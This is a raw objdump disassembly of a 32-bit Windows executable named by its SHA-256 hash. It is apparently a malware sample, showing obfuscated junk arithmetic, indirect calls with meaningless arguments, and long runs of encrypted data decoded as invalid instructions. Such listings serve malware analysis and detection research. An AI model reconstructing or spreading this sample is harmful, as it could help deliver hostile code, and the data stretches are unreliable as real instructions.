
e5b2cf4fa207e0773bbc18f886f54b62081bb75fcc6eb5745a19fd4305827153.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x70
  401006:	mov    eax,DWORD PTR [ebp-0x50]
  401009:	mov    ecx,DWORD PTR [ebp-0x4c]
  40100c:	cmp    DWORD PTR ds:0x4281ad,0x0
  401013:	mov    edx,DWORD PTR ds:0x428239
  401019:	mov    DWORD PTR ds:0x428279,0x39de
  401023:	mov    DWORD PTR ds:0x4281a9,0x4199
  40102d:	mov    DWORD PTR ds:0x428281,ebx
  401033:	jmp    0x4010c8
  401038:	mov    DWORD PTR ds:0x428201,edx
  40103e:	mov    DWORD PTR ds:0x4282c1,0x153c
  401048:	cmp    DWORD PTR ds:0x4281ad,0x0
  40104f:	jle    0x4010a4
  401055:	push   DWORD PTR [ebp-0x28]
  401058:	push   0x615c
  40105d:	push   0x3d5a
  401062:	push   0x87b7
  401067:	push   0x4280cb
  40106c:	push   0x6e35
  401071:	call   DWORD PTR ds:0x4289b0
  401077:	add    edx,0x3cf1
  40107d:	xor    edx,edx
  40107f:	or     edx,DWORD PTR ds:0x4281ad
  401085:	adc    DWORD PTR ds:0x428235,edx
  40108b:	mov    edx,DWORD PTR ds:0x4282b5
  401091:	adc    DWORD PTR ds:0x428285,edx
  401097:	movzx  edx,BYTE PTR ds:0x428195
  40109e:	adc    DWORD PTR ds:0x428231,edx
  4010a4:	sbb    edx,0x32fb
  4010aa:	or     DWORD PTR ds:0x428219,0x6fee
  4010b4:	xor    DWORD PTR ds:0x428239,0x6714
  4010be:	xor    DWORD PTR ds:0x428281,0x2ec9
  4010c8:	mov    edx,DWORD PTR [ebp-0x50]
  4010cb:	sub    eax,edx
  4010cd:	jmp    0x401377
  4010d2:	mov    bl,0x69
  4010d4:	(bad)  [ebx+0x69b3b930]
  4010da:	cdq    
  4010db:	(bad)  
  4010dc:	jg     0x401119
  4010de:	xor    eax,edx
  4010e0:	and    eax,0xbbbbbb31
  4010e5:	mov    ebx,0xbbbbbfd0
  4010ea:	jb     0x4010ba
  4010ec:	dec    ebx
  4010ed:	cmp    dl,BYTE PTR [ebx]
  4010ef:	jne    0x4010d4
  4010f1:	ficom  DWORD PTR ss:[edi+0x14bb95f1]
  4010f8:	and    esi,DWORD PTR [esi]
  4010fa:	ret    
  4010fb:	cmc    
  4010fc:	fcmovbe st,st(4)
  4010fe:	bound  ebp,QWORD PTR [ebp-0x4a]
  401101:	loope  0x4010ed
  401103:	pop    esp
  401104:	outs   dx,DWORD PTR ds:[esi]
  401105:	call   0xd6d22cfc
  40110a:	ret    0xae25
  40110d:	popf   
  40110e:	adc    BYTE PTR [ecx+0xc348164],0xf4
  401115:	aaa    
  401116:	ds fcmovnu st,st(3)
  401119:	mov    dl,0xc5
  40111b:	adc    ebx,DWORD PTR [edx-0x7a9c74d6]
  401121:	fwait
  401122:	retf   0x3cba
  401125:	imul   dh
  401127:	jb     0x40113b
  401129:	mov    ch,0x95
  40112b:	popa   
  40112c:	sti    
  40112d:	out    dx,al
  40112e:	aas    
  40112f:	imul   esp,DWORD PTR [edx+esi*2+0x7ddcc759],0x606ff14a
  40113a:	das    
  40113b:	sub    bh,BYTE PTR [edi+eax*1+0x59ed7833]
  401142:	ret    0xffc5
  401145:	mov    edi,DWORD PTR [ecx-0x3b39b92e]
  40114b:	inc    edx
  40114c:	scas   eax,DWORD PTR es:[edi]
  40114d:	and    BYTE PTR ds:0x6774529d,bh
  401153:	dec    esi
  401154:	inc    eax
  401155:	scas   al,BYTE PTR es:[edi]
  401156:	les    eax,FWORD PTR [edx]
  401158:	(bad)  
  401159:	fild   QWORD PTR [eax+0x1c74ebfb]
  40115f:	(bad)  
  401160:	cmp    BYTE PTR [ecx+0x6043cb22],ah
  401166:	(bad)  
  401167:	dec    ebp
  401168:	or     al,0xa8
  40116a:	or     BYTE PTR [ecx-0x37],0x20
  40116e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40116f:	inc    esp
  401170:	or     eax,0xfba20105
  401175:	mov    bl,BYTE PTR [ebp+0x47b57078]
  40117b:	mov    al,0xed
  40117d:	inc    eax
  40117e:	mov    dl,0xc9
  401180:	imul   cl
  401182:	and    al,0x2e
  401184:	adc    dh,BYTE PTR [esi]
  401186:	sub    BYTE PTR [ecx],ah
  401188:	jnp    0x401195
  40118a:	cld    
  40118b:	jg     0x401125
  40118d:	mov    bh,0xb4
  40118f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401190:	push   ebp
  401191:	data16 mov BYTE PTR [ecx-0x25432674],0x3a
  401199:	fadd   st(4),st
  40119b:	aad    0xff
  40119d:	jb     0x401167
  40119f:	mov    esi,0x3794fddd
  4011a4:	pop    esi
  4011a5:	into   
  4011a6:	jl     0x4011cd
  4011a8:	sti    
  4011a9:	out    0xf1,al
  4011ab:	(bad)  
  4011ac:	(bad)  
  4011ae:	fcmovnu st,st(2)
  4011b0:	inc    ebx
  4011b1:	jecxz  0x40120e
  4011b3:	push   es
  4011b4:	call   0x62c67dbf
  4011b9:	or     al,0xd
  4011bb:	xchg   dh,dl
  4011bd:	lods   eax,DWORD PTR ds:[esi]
  4011be:	xchg   esi,eax
  4011bf:	loop   0x40123c
  4011c1:	jecxz  0x40123f
  4011c3:	jbe    0x401150
  4011c5:	or     ebx,esp
  4011c7:	imul   ecx,ebx,0xfcf82cb
  4011cd:	clc    
  4011ce:	pop    esi
  4011cf:	repz xchg ebx,eax
  4011d1:	inc    ebx
  4011d2:	push   edx
  4011d3:	xchg   ebp,eax
  4011d4:	in     al,0xc8
  4011d6:	sbb    eax,0x35971ed8
  4011db:	ds aam 0xc7
  4011de:	inc    eax
  4011df:	aad    0x36
  4011e1:	and    al,BYTE PTR [ebp+0x6b]
  4011e4:	sub    bh,BYTE PTR [esi-0x6f]
  4011e7:	rcr    BYTE PTR [eax+0x722eef3f],1
  4011ed:	xor    al,0x14
  4011ef:	imul   esi,DWORD PTR [edx+0x18a2c280],0xd7734ea1
  4011f9:	mov    DWORD PTR [esi+0x6c31b42a],ecx
  4011ff:	cli    
  401200:	mov    dl,0xe0
  401202:	int3   
  401203:	dec    ebx
  401204:	fnsave [ebx+0x55]
  401207:	or     BYTE PTR [eax+0x39],bl
  40120a:	call   0xdf1e:0x8d33b81c
  401211:	sub    eax,0x95318297
  401216:	into   
  401217:	(bad)  
  401218:	fistp  QWORD PTR [ebx]
  40121a:	cmc    
  40121b:	dec    edi
  40121c:	push   es
  40121d:	int3   
  40121e:	cmp    ecx,DWORD PTR [ebx+0x2348eb18]
  401224:	fsub   QWORD PTR [ebp-0x7e5c3e22]
  40122a:	retf   0xa141
  40122d:	popf   
  40122e:	cmp    BYTE PTR [eax+0x27],bl
  401231:	mov    dl,0x47
  401233:	ins    DWORD PTR es:[edi],dx
  401234:	adc    DWORD PTR [edx],esi
  401236:	pop    ss
  401237:	push   0x60
  401239:	arpl   WORD PTR [eax],bp
  40123b:	sbb    ah,cl
  40123d:	data16 mov dh,0x5
  401240:	and    BYTE PTR [eax],dh
  401242:	mov    ds:0x177ac28f,eax
  401247:	loope  0x4011dd
  401249:	and    al,bh
  40124b:	sahf   
  40124c:	xor    cl,al
  40124e:	adc    eax,0x5a6789b1
  401253:	mov    ch,0x5a
  401255:	sub    eax,0xfbcc6095
  40125a:	fwait
  40125b:	inc    ebx
  40125c:	fcom   st(5)
  40125e:	jle    0x401225
  401260:	or     esp,DWORD PTR [eax+0x7a]
  401263:	inc    ecx
  401265:	loopne 0x4012ca
  401267:	push   edx
  401268:	lss    esp,FWORD PTR [ecx+0x2fcf6062]
  40126f:	es jne 0x4011f9
  401272:	sub    ecx,edx
  401274:	add    ah,BYTE PTR [esi]
  401276:	xor    eax,0xdf83be33
  40127b:	popf   
  40127c:	cmc    
  40127d:	and    ch,BYTE PTR [ecx]
  40127f:	inc    esp
  401280:	iret   
  401281:	pop    eax
  401282:	sub    bl,BYTE PTR [edx+0x25517389]
  401288:	inc    esp
  401289:	mov    edx,0x4d78b390
  40128e:	(bad)  
  40128f:	mov    al,0x3b
  401291:	in     eax,dx
  401292:	ins    BYTE PTR es:[edi],dx
  401293:	addr16 mov esp,0x7bf7c21a
  401299:	jge    0x40129d
  40129b:	push   cs
  40129c:	xchg   ebx,eax
  40129d:	loope  0x401241
  40129f:	lock leave 
  4012a1:	push   edx
  4012a2:	test   eax,0xc08a79aa
  4012a7:	hlt    
  4012a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4012a9:	mov    ebx,0xbca272f
  4012ae:	fld    QWORD PTR [esi+eax*1+0x29a58e66]
  4012b5:	lock sbb DWORD PTR [edi-0x70],esp
  4012b9:	out    0xa3,al
  4012bb:	dec    esp
  4012bc:	cmp    DWORD PTR [edi+0x69931262],ecx
  4012c2:	stc    
  4012c3:	sub    DWORD PTR [edx+0x56098f14],edi
  4012c9:	dec    edx
  4012ca:	pop    edx
  4012cb:	push   ds
  4012cc:	ja     0x40125c
  4012ce:	js     0x4012c6
  4012d0:	mov    dl,0x82
  4012d2:	fld    TBYTE PTR [eax]
  4012d4:	clc    
  4012d5:	test   eax,0xdf9af470
  4012da:	inc    ebx
  4012db:	mov    esp,0xeb52db52
  4012e0:	cmp    eax,0xdb826221
  4012e5:	das    
  4012e6:	push   ebp
  4012e7:	xor    al,0xf6
  4012e9:	sti    
  4012ea:	or     al,0xe9
  4012ec:	mov    ?,edi
  4012ee:	icebp  
  4012ef:	push   ebp
  4012f0:	push   es
  4012f1:	pop    ebp
  4012f2:	jge    0x4012ce
  4012f4:	jb     0x401351
  4012f6:	mov    edi,0x6106f2b4
  4012fb:	aam    0x5
  4012fd:	fwait
  4012fe:	add    al,BYTE PTR [ebp-0x17]
  401301:	adc    BYTE PTR [ecx+0x26],bh
  401304:	jnp    0x4012b8
  401306:	std    
  401307:	jmp    0xf752:0x98bc6c1
  40130e:	outs   dx,DWORD PTR ds:[esi]
  40130f:	add    eax,0xc446339e
  401314:	sbb    DWORD PTR [edx-0xa],esi
  401317:	adc    eax,0xcfaa4730
  40131c:	push   edx
  40131d:	mov    esp,0xec6b5d0d
  401322:	xchg   ebp,eax
  401323:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401324:	cmp    DWORD PTR [ecx+0x2a],esp
  401327:	pop    eax
  401328:	push   es
  401329:	xor    ah,BYTE PTR [edx-0x35]
  40132c:	push   ss
  40132d:	ja     0x40139f
  40132f:	and    bh,BYTE PTR [ebx+edx*1+0x0]
  401333:	cdq    
  401334:	add    al,0x6f
  401336:	fdivr  st(3),st
  401338:	aaa    
  401339:	or     eax,0xb695744
  40133e:	loop   0x401320
  401340:	jnp    0x4013b7
  401342:	pop    es
  401343:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401344:	fisubr DWORD PTR [ecx-0x74]
  401347:	sub    esi,DWORD PTR [ecx]
  401349:	ret    0x90
  40134c:	ins    BYTE PTR es:[edi],dx
  40134d:	scas   al,BYTE PTR es:[edi]
  40134e:	push   0xffffffc4
  401350:	jecxz  0x4013b2
  401352:	sub    BYTE PTR [edx-0x1865b5d4],dh
  401358:	out    dx,al
  401359:	or     DWORD PTR [edi-0x1e],esi
  40135c:	inc    eax
  40135d:	shl    BYTE PTR [eax+0x1e],cl
  401360:	clc    
  401361:	imul   edx,DWORD PTR [ecx+eiz*1+0x54],0xffffff81
  401366:	mov    eax,0xb2e58fdc
  40136b:	pop    eax
  40136c:	sbb    edi,DWORD PTR [eax+0x1f]
  40136f:	jmp    0x5826:0xf3b8a750
  401376:	add    eax,0x15158b57
  40137b:	add    BYTE PTR [edx+0x0],0x8b
  40137f:	jge    0x401335
  401381:	mov    DWORD PTR [ebp-0x50],eax
  401384:	sbb    ecx,edi
  401386:	movzx  edx,BYTE PTR ds:0x428229
  40138d:	adc    DWORD PTR ds:0x4281ad,edx
  401393:	mov    DWORD PTR [ebp-0x4c],ecx
  401396:	or     DWORD PTR [ebp-0x50],0xcb88df42
  40139d:	cmp    DWORD PTR ds:0x428279,0x0
  4013a4:	mov    ecx,0x6814
  4013a9:	mov    DWORD PTR ds:0x42826d,ecx
  4013af:	jmp    0x4013f5
  4013b4:	mov    eax,0x574
  4013b9:	cmp    DWORD PTR ds:0x428279,0x0
  4013c0:	jle    0x4013e7
  4013c6:	push   DWORD PTR [ebp-0x14]
  4013c9:	push   0x66c6
  4013ce:	call   DWORD PTR ds:0x4289b4
  4013d4:	sub    ecx,ecx
  4013d6:	add    ecx,ecx
  4013d8:	inc    edi
  4013d9:	xor    edi,edi
  4013db:	add    edi,DWORD PTR ds:0x428285
  4013e1:	adc    DWORD PTR ds:0x428235,edi
  4013e7:	sbb    DWORD PTR ds:0x428285,ecx
  4013ed:	sbb    edi,edx
  4013ef:	adc    DWORD PTR ds:0x42823d,ecx
  4013f5:	or     DWORD PTR [ebp-0x4c],0x9d2b8af8
  4013fc:	mov    eax,DWORD PTR [ebp-0x58]
  4013ff:	sbb    DWORD PTR ds:0x428195,ebx
  401405:	mov    ecx,DWORD PTR [ebp-0x54]
  401408:	or     DWORD PTR ds:0x4282bd,edi
  40140e:	mov    edx,DWORD PTR [ebp-0x58]
  401411:	movzx  edi,BYTE PTR ds:0x428201
  401418:	sbb    DWORD PTR ds:0x428271,edi
  40141e:	mov    edi,DWORD PTR [ebp-0x54]
  401421:	sub    eax,edx
  401423:	mov    DWORD PTR [ebp-0x58],eax
  401426:	sbb    ecx,edi
  401428:	mov    DWORD PTR [ebp-0x54],ecx
  40142b:	cmp    DWORD PTR ds:0x428275,0x0
  401432:	mov    DWORD PTR ds:0x428225,0xb7
  40143c:	mov    DWORD PTR ds:0x428195,0x8bc
  401446:	mov    DWORD PTR ds:0x428235,0x1cbc
  401450:	mov    DWORD PTR ds:0x428231,edi
  401456:	jmp    0x401535
  40145b:	mov    DWORD PTR ds:0x428271,0xf44
  401465:	cmp    DWORD PTR ds:0x428275,0x0
  40146c:	jae    0x4014a6
  401472:	push   0x2688
  401477:	push   0x428275
  40147c:	push   0x5f28
  401481:	push   0x8a79
  401486:	call   DWORD PTR ds:0x4289b8
  40148c:	xor    edi,edi
  40148e:	or     edi,DWORD PTR ds:0x428215
  401494:	adc    DWORD PTR ds:0x428289,edi
  40149a:	xor    DWORD PTR ds:0x428229,edx
  4014a0:	and    DWORD PTR ds:0x428269,edx
  4014a6:	xor    edi,DWORD PTR ds:0x42826d
  4014ac:	adc    ecx,DWORD PTR ds:0x4281a5
  4014b2:	xor    DWORD PTR ds:0x4281a9,edi
  4014b8:	cmp    DWORD PTR ds:0x428211,0x0
  4014bf:	mov    edx,DWORD PTR ds:0x428195
  4014c5:	mov    DWORD PTR ds:0x42819d,0x616f
  4014cf:	not    edi
  4014d1:	mov    DWORD PTR ds:0x4281a5,0x9a2
  4014db:	jmp    0x401535
  4014e0:	movzx  ecx,WORD PTR ds:0x4281a9
  4014e7:	cmp    DWORD PTR ds:0x428211,0x0
  4014ee:	je     0x40151e
  4014f4:	push   DWORD PTR [ebp-0x20]
  4014f7:	call   DWORD PTR ds:0x428a48
  4014fd:	movzx  ecx,WORD PTR ds:0x428191
  401504:	add    ecx,DWORD PTR ds:0x428285
  40150a:	mov    DWORD PTR ds:0x428191,ecx
  401510:	and    edx,0x1992
  401516:	xor    DWORD PTR ds:0x428289,edx
  40151c:	adc    edx,edi
  40151e:	inc    ecx
  40151f:	adc    DWORD PTR ds:0x428221,0x71c6
  401529:	mov    ecx,DWORD PTR ds:0x428241
  40152f:	sub    DWORD PTR ds:0x4282b5,ecx
  401535:	or     DWORD PTR [ebp-0x58],0xcb88a35a
  40153c:	or     DWORD PTR [ebp-0x54],0x9d2b8af8
  401543:	add    DWORD PTR ds:0x428201,ebx
  401549:	lea    eax,[ebp+0x20]
  40154c:	xor    ecx,ecx
  40154e:	add    ecx,DWORD PTR ds:0x4282c5
  401554:	add    DWORD PTR ds:0x428201,ecx
  40155a:	mov    DWORD PTR [ebp-0xc],eax
  40155d:	mov    eax,ds:0x422120
  401562:	adc    DWORD PTR ds:0x4282b1,edi
  401568:	mov    ecx,DWORD PTR [ebp-0xc]
  40156b:	mov    eax,DWORD PTR [eax]
  40156d:	add    eax,DWORD PTR [ecx]
  40156f:	xor    edi,edi
  401571:	add    edi,DWORD PTR ds:0x4281d5
  401577:	mov    edx,DWORD PTR ds:0x428295
  40157d:	sub    edi,edx
  40157f:	add    edi,DWORD PTR [edi+edx*1]
  401582:	mov    edi,0x32e26d9d
  401587:	and    DWORD PTR ds:0x4282c9,0x51d9
  401591:	jmp    0x40183b
  401596:	das    
  401597:	jp     0x4015d4
  401599:	mov    bl,0x6f
  40159b:	mov    bl,0x37
  40159d:	xchg   BYTE PTR [ecx-0x548ed009],ah
  4015a3:	sbb    bl,BYTE PTR [ebp-0x44402f91]
  4015a9:	mov    ebx,0xbbbbbfd0
  4015ae:	pop    eax
  4015af:	je     0x4015e0
  4015b1:	pop    ecx
  4015b2:	jg     0x401607
  4015b4:	idiv   DWORD PTR [edi-0x25]
  4015b7:	ja     0x4015d8
  4015b9:	bound  esp,QWORD PTR [edx+0x140099aa]
  4015bf:	sbb    esi,DWORD PTR [ebp-0x3d]
  4015c2:	cmp    al,0xa5
  4015c4:	xchg   esi,eax
  4015c5:	add    BYTE PTR [edx+0x66b770e1],cl
  4015cb:	jae    0x401612
  4015cd:	enter  0xafd4,0xad
  4015d1:	xor    DWORD PTR [ebx],edi
  4015d3:	js     0x4015c6
  4015d5:	sbb    ch,BYTE PTR [ecx+0x30]
  4015d8:	and    edi,edx
  4015da:	stos   DWORD PTR es:[edi],eax
  4015db:	pop    eax
  4015dc:	cld    
  4015dd:	out    0x92,al
  4015df:	aas    
  4015e0:	fdivr  DWORD PTR [edi+0x22]
  4015e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4015e4:	and    eax,0x97557330
  4015e9:	sub    DWORD PTR [esi+0x3c5bce83],eax
  4015ef:	mov    esp,DWORD PTR [edi+ecx*1]
  4015f2:	loopne 0x4015ae
  4015f4:	xchg   ebx,eax
  4015f5:	nop
  4015f6:	adc    al,0x44
  4015f8:	pop    edx
  4015f9:	iret   
  4015fa:	pushf  
  4015fb:	jnp    0x401669
  4015fd:	mov    bh,0x42
  4015ff:	inc    edi
  401600:	sub    ebx,DWORD PTR [eax+0x18ad8d4]
  401606:	fisubr DWORD PTR ds:0x79e9da19
  40160c:	daa    
  40160d:	mov    ah,0x5e
  40160f:	and    eax,0x83150190
  401614:	or     al,0x69
  401616:	test   DWORD PTR [ecx],edx
  401618:	in     al,0x6a
  40161a:	inc    esi
  40161b:	fistp  DWORD PTR [ebx]
  40161d:	jle    0x401680
  40161f:	retf   
  401620:	lahf   
  401621:	gs sub eax,0x31739837
  401627:	cdq    
  401628:	(bad)  
  401629:	mov    ecx,0x4e7681a
  40162e:	and    DWORD PTR [eax],edx
  401630:	pushf  
  401631:	add    al,0xdf
  401633:	jg     0x401662
  401635:	mov    al,0xa0
  401637:	fsubrp st(6),st
  401639:	popa   
  40163a:	call   FWORD PTR [edx+0x425d08eb]
  401640:	fcomp  QWORD PTR [eax-0x220c3f7c]
  401646:	dec    ebp
  401647:	ror    BYTE PTR [edx+0x27],cl
  40164a:	idiv   esi
  40164c:	push   ebp
  40164d:	xor    edx,DWORD PTR [esi-0x2cafa575]
  401653:	cmp    bl,bl
  401655:	or     cl,BYTE PTR ds:0x4072b3e6
  40165b:	or     edi,edx
  40165d:	ret    0x4a5c
  401660:	out    0xa9,eax
  401662:	je     0x401623
  401664:	gs push ebp
  401666:	icebp  
  401667:	(bad)  
  401668:	adc    BYTE PTR [eax+0x46e17aa8],dl
  40166e:	(bad)  
  401670:	jecxz  0x401693
  401672:	lahf   
  401673:	pop    esi
  401674:	jmp    0x3966669a
  401679:	jmp    0x93c8:0x8dfc80e8
  401680:	stos   BYTE PTR es:[edi],al
  401681:	cdq    
  401682:	push   esp
  401683:	push   edx
  401684:	ins    DWORD PTR es:[edi],dx
  401685:	shr    DWORD PTR [ebp-0x54711232],0x8c
  40168c:	dec    ecx
  40168d:	cld    
  40168e:	test   DWORD PTR [eax+0x7f],esi
  401691:	adc    cl,cl
  401693:	loop   0x401658
  401695:	hlt    
  401696:	scas   eax,DWORD PTR es:[edi]
  401697:	pop    esi
  401698:	jecxz  0x4016cb
  40169a:	ror    eax,cl
  40169c:	mov    ah,0x4e
  40169e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40169f:	addr16 es mov edi,0xcb725b18
  4016a6:	rcr    dh,0x7c
  4016a9:	hlt    
  4016aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4016ab:	sub    bh,al
  4016ad:	pop    es
  4016ae:	push   ebp
  4016af:	ja     0x4016ec
  4016b1:	mov    dh,BYTE PTR [edi+0x30]
  4016b4:	not    DWORD PTR [eax]
  4016b6:	pop    ecx
  4016b7:	pushf  
  4016b8:	cli    
  4016b9:	(bad)  
  4016ba:	fwait
  4016bb:	mov    ebx,0xa6240697
  4016c0:	stos   DWORD PTR es:[edi],eax
  4016c1:	lds    esp,FWORD PTR [edi+0xb]
  4016c4:	xchg   BYTE PTR [ecx-0x46e110a2],ch
  4016ca:	inc    edi
  4016cb:	mov    ebp,0x802316cc
  4016d0:	pop    ebx
  4016d1:	scas   eax,DWORD PTR es:[edi]
  4016d2:	sbb    esp,ebp
  4016d4:	cmp    ch,BYTE PTR [edx-0x32]
  4016d7:	ins    BYTE PTR es:[edi],dx
  4016d8:	retf   
  4016d9:	mov    DWORD PTR [ebx+0x64a5bcda],esi
  4016df:	and    dh,BYTE PTR [edx]
  4016e1:	cli    
  4016e2:	sbb    al,0xbc
  4016e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4016e5:	mov    al,0x28
  4016e7:	(bad)  
  4016e8:	in     al,dx
  4016e9:	jb     0x401760
  4016eb:	das    
  4016ec:	dec    ecx
  4016ed:	push   ds
  4016ee:	pop    es
  4016ef:	stos   BYTE PTR es:[edi],al
  4016f0:	das    
  4016f1:	outs   dx,BYTE PTR ds:[esi]
  4016f2:	outs   dx,DWORD PTR ds:[esi]
  4016f3:	fisttp DWORD PTR [edi+0x2c7d34e1]
  4016f9:	cmp    al,0xa2
  4016fb:	sti    
  4016fc:	and    BYTE PTR [edi+0x7f],dl
  4016ff:	pushf  
  401700:	(bad)  [edi]
  401702:	xchg   edi,eax
  401703:	pusha  
  401704:	xor    eax,0x3c20995f
  401709:	jp     0x401731
  40170b:	les    ecx,FWORD PTR [ebp+0x37]
  40170e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40170f:	lock xor al,0x8a
  401712:	dec    ebp
  401713:	adc    eax,ebp
  401715:	(bad)  
  401717:	daa    
  401718:	cmp    DWORD PTR [esi+0x55],ecx
  40171b:	and    eax,0xb239f941
  401720:	sbb    ch,BYTE PTR [eax+edi*8]
  401723:	add    BYTE PTR [eax+0x77207a7b],cl
  401729:	mov    bh,0xa6
  40172b:	or     bl,BYTE PTR [edx-0x1f]
  40172e:	mov    edi,0xe88fd537
  401733:	ds add al,0x2f
  401736:	retf   
  401737:	fwait
  401738:	les    esi,FWORD PTR ds:0x59359cf1
  40173e:	sbb    eax,0x90d3b90d
  401743:	mov    dl,BYTE PTR [ecx+ebp*4]
  401746:	jae    0x401733
  401748:	adc    DWORD PTR [esi],esi
  40174a:	(bad)  
  40174b:	jb     0x4017ba
  40174d:	sub    dl,dh
  40174f:	loopne 0x40176c
  401751:	jge    0x40177f
  401753:	pop    ecx
  401754:	pusha  
  401755:	jle    0x401775
  401757:	mov    al,bl
  401759:	(bad)  
  40175a:	js     0x40172d
  40175c:	imul   ebp,DWORD PTR [edi+0x78695c36],0x50
  401763:	fcom   DWORD PTR [eax-0x21]
  401766:	xchg   ecx,eax
  401767:	and    ebx,DWORD PTR [ebx-0x10a0a938]
  40176d:	ror    edi,cl
  40176f:	sub    BYTE PTR [edx+0xa8a58ca],dl
  401775:	jmp    ebx
  401777:	out    dx,eax
  401778:	retf   
  401779:	xor    eax,DWORD PTR es:[ebp-0x75acfd6]
  401780:	add    al,0x13
  401782:	int    0xb8
  401784:	retf   0xe26d
  401787:	push   ds
  401788:	mov    al,ds:0x8aa3e0fa
  40178d:	pusha  
  40178e:	jp     0x4017c8
  401790:	loopne 0x4017bf
  401792:	mov    ch,0x56
  401794:	pusha  
  401795:	iret   
  401796:	(bad)  
  401797:	imul   BYTE PTR [edi-0x527f127d]
  40179d:	mov    dh,0xfa
  40179f:	(bad)  
  4017a3:	nop
  4017a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4017a5:	inc    esp
  4017a6:	pusha  
  4017a7:	push   edi
  4017a8:	jno    0x40179d
  4017aa:	add    al,0xbc
  4017ac:	pop    eax
  4017ad:	call   0x7765:0x43b365dc
  4017b4:	fidiv  DWORD PTR [edx]
  4017b6:	enter  0x6881,0xe5
  4017ba:	repz sar DWORD PTR [eax-0x58],1
  4017be:	ins    DWORD PTR es:[edi],dx
  4017bf:	jge    0x401782
  4017c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4017c2:	int3   
  4017c3:	test   al,0xdb
  4017c5:	sub    al,BYTE PTR [esp+ecx*1-0x1a]
  4017c9:	js     0x40182e
  4017cb:	les    ebp,FWORD PTR [edx-0x27]
  4017ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4017cf:	int3   
  4017d0:	pop    ebx
  4017d1:	lea    eax,[ebx+0x1b]
  4017d4:	clc    
  4017d5:	mov    al,0x2c
  4017d7:	push   0x69
  4017d9:	or     ah,BYTE PTR es:0xdb1d6aed
  4017e0:	out    0x6d,al
  4017e2:	xchg   ebx,eax
  4017e3:	xor    eax,0x3b5dd63b
  4017e8:	aaa    
  4017e9:	xchg   esp,eax
  4017ea:	xchg   edx,eax
  4017eb:	std    
  4017ec:	mov    ds:0x1c8a24c1,eax
  4017f1:	sbb    al,0xac
  4017f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4017f4:	or     ch,al
  4017f6:	add    bl,dl
  4017f8:	xchg   esi,eax
  4017f9:	aad    0xfb
  4017fb:	sbb    edx,DWORD PTR [esi+0x16b71731]
  401801:	rcr    DWORD PTR [edx],cl
  401803:	jmp    0xbf47:0x49d9065e
  40180a:	out    dx,eax
  40180b:	or     DWORD PTR [ebx-0x2cbd4970],ebp
  401811:	mov    dh,0x2c
  401813:	fsub   DWORD PTR [eax-0x47f09d99]
  401819:	icebp  
  40181a:	and    BYTE PTR [edx+ebp*2-0x647a27d9],ch
  401821:	jnp    0x40180c
  401823:	(bad)  
  401826:	fcmovb st,st(1)
  401828:	ds adc eax,0xeb3668c9
  40182e:	fist   DWORD PTR [eax+0x22]
  401831:	hlt    
  401832:	cmp    ecx,eax
  401834:	inc    esi
  401835:	stc    
  401836:	mov    esp,0xa9a22c4a
  40183b:	mov    DWORD PTR [ebp-0x14],eax
  40183e:	mov    eax,DWORD PTR [ebp+0x18]
  401841:	cmp    DWORD PTR ds:0x428199,0x0
  401848:	mov    DWORD PTR ds:0x4281a9,ebx
  40184e:	mov    edx,DWORD PTR ds:0x428279
  401854:	mov    edx,DWORD PTR ds:0x428281
  40185a:	jmp    0x4018ac
  40185f:	mov    DWORD PTR ds:0x428201,ebx
  401865:	cmp    DWORD PTR ds:0x428199,0x0
  40186c:	jb     0x401890
  401872:	push   0x428001
  401877:	push   DWORD PTR [ebp-0x14]
  40187a:	call   DWORD PTR ds:0x428a4c
  401880:	and    ecx,ecx
  401882:	adc    ecx,edx
  401884:	xor    DWORD PTR ds:0x428201,edi
  40188a:	xor    edx,DWORD PTR ds:0x428195
  401890:	xor    DWORD PTR ds:0x4282b5,ecx
  401896:	xor    DWORD PTR ds:0x4281a1,0x26ce
  4018a0:	or     ecx,DWORD PTR ds:0x428195
  4018a6:	xor    edx,0x7960
  4018ac:	mov    ecx,DWORD PTR [ebp+0x1c]
  4018af:	shrd   eax,ecx,0x2
  4018b3:	add    edx,0x3938
  4018b9:	shr    ecx,0x2
  4018bc:	jmp    0x401b66
  4018c1:	xchg   esi,eax
  4018c2:	(bad)  
  4018c3:	cmp    cl,ch
  4018c5:	push   edx
  4018c6:	mov    WORD PTR [esp+edx*4+0x310bccdf],ds
  4018cd:	daa    
  4018ce:	cmp    DWORD PTR cs:[ebx],0xbbbbc9df
  4018d5:	sar    BYTE PTR [edi-0x61574445],1
  4018db:	mov    esi,0xb4caa709
  4018e0:	jo     0x4018f6
  4018e2:	add    eax,0x259af0e0
  4018e7:	sub    DWORD PTR [ebx-0x5f],ecx
  4018ea:	xchg   esp,eax
  4018eb:	(bad)  
  4018ec:	sub    DWORD PTR [ecx-0x63],esp
  4018ef:	push   ds
  4018f0:	test   al,0x96
  4018f2:	mov    edi,0x4f202559
  4018f7:	inc    eax
  4018f8:	std    
  4018f9:	inc    ebp
  4018fa:	mov    ah,0x98
  4018fc:	xchg   ebp,eax
  4018fd:	(bad)  
  4018fe:	jle    0x401970
  401900:	popf   
  401901:	mov    WORD PTR [eax-0x66],?
  401904:	(bad)  
  401905:	test   al,0xf6
  401907:	dec    esp
  401908:	in     al,0x49
  40190a:	jnp    0x401898
  40190c:	fwait
  40190d:	inc    esi
  40190e:	push   ebx
  40190f:	dec    eax
  401910:	cmp    ah,BYTE PTR [ebx+0x88f601a]
  401916:	data16 cld 
  401918:	and    edx,DWORD PTR ds:0xd4ca0214
  40191e:	add    eax,DWORD PTR [eax]
  401920:	jmp    0x972c:0x168c402a
  401927:	xchg   ebx,eax
